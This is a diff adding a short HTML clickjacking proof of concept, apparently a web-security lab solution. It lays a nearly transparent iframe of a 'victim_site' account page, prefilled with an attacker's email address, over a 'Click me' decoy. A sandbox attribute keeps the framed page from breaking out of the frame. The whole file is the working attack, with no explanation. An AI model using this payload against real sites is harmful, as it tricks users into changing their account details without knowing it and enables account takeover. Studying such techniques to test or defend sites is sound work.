@@ -1,0 +1,18 @@
+<style>
+    iframe {
+        position:relative;
+        width: 500px;
+        height: 700px;
+        opacity: 0.1;
+        z-index: 2;
+    }
+    div {
+        position:absolute;
+        top: 460px;
+        left:60px;
+        z-index: 1;
+    }
+ </style>
+ <div>Click me</div>
+
+<iframe id="victim_site" src="victim_site/my-account?email=test2@test.com" sandbox="allow-forms"></iframe>
